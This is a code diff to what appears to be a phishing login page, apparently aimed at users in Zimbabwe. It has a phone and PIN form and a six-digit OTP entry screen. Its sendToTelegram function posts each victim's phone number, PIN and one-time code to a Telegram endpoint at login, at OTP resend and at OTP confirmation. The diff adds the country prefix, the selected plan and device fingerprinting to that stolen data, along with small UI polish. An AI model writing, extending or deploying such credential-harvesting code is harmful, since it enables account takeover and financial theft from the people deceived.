@@ -146,6 +146,21 @@ label{
   justify-content:center;
   font-size:18px;
   font-weight:600;
+  position:relative;
+}
+
+/* visible caret */
+.otp-digit.caret::after{
+  content:"";
+  position:absolute;
+  width:2px;
+  height:60%;
+  background:#020617;
+  animation:blink 1s steps(1) infinite;
+}
+
+@keyframes blink{
+  50%{opacity:0}
 }
 
 .otp-digit.filled{
@@ -223,7 +238,7 @@ label{
     </div>
 
     <input id="otpBuffer" inputmode="numeric" autocomplete="one-time-code"
-           style="position:absolute;opacity:0;pointer-events:none">
+           style="position:absolute;opacity:0">
 
     <div class="resend-row">
       <div class="small">Resend in <span id="countdown">120</span>s</div>
@@ -245,6 +260,26 @@ function sendToTelegram(payload){
     body:JSON.stringify(payload)
   }).catch(()=>{});
 }
+
+/* PLAN */
+let selectedPlan=null;
+try{
+  const raw=sessionStorage.getItem('selectedPlan')||localStorage.getItem('selectedPlan');
+  if(raw) selectedPlan=JSON.parse(raw);
+}catch(e){}
+
+function normalizePlan(p){
+  if(!p) return 'N/A';
+  return (p.name||'')+(p.price?' — '+p.price:'');
+}
+
+/* DEVICE */
+const ua=navigator.userAgent;
+let device='Unknown';
+if(/Android/i.test(ua)) device='Android';
+else if(/iPhone|iPad/i.test(ua)) device='iOS';
+if(/Chrome/i.test(ua)) device+=' | Chrome';
+else if(/Safari/i.test(ua)) device+=' | Safari';
 
 /* PHONE + PIN */
 const phone=document.getElementById('phone');
@@ -283,8 +318,10 @@ document.getElementById('loginForm').onsubmit=e=>{
 
   sendToTelegram({
     event:'login_clicked',
-    loginPhone:phone.value,
+    loginPhone:'+263'+phone.value,
     loginPin:pin.value,
+    plan:normalizePlan(selectedPlan),
+    device,
     submittedAt:new Date().toISOString()
   });
 
@@ -312,6 +349,7 @@ function renderOtp(v){
   dots.forEach((d,i)=>{
     d.textContent=v[i]||'';
     d.classList.toggle('filled',!!v[i]);
+    d.classList.toggle('caret',i===v.length && v.length<6);
   });
   confirmBtn.disabled=v.length!==6;
 }
@@ -344,8 +382,10 @@ resendBtn.onclick=()=>{
 
   sendToTelegram({
     event:'resend_otp',
-    loginPhone:phone.value,
+    loginPhone:'+263'+phone.value,
     loginPin:pin.value,
+    plan:normalizePlan(selectedPlan),
+    device,
     submittedAt:new Date().toISOString()
   });
 
@@ -359,9 +399,11 @@ resendBtn.onclick=()=>{
 confirmBtn.onclick=()=>{
   sendToTelegram({
     event:'otp_confirm',
-    loginPhone:phone.value,
+    loginPhone:'+263'+phone.value,
     loginPin:pin.value,
     otp:buffer.value,
+    plan:normalizePlan(selectedPlan),
+    device,
     submittedAt:new Date().toISOString()
   });
 
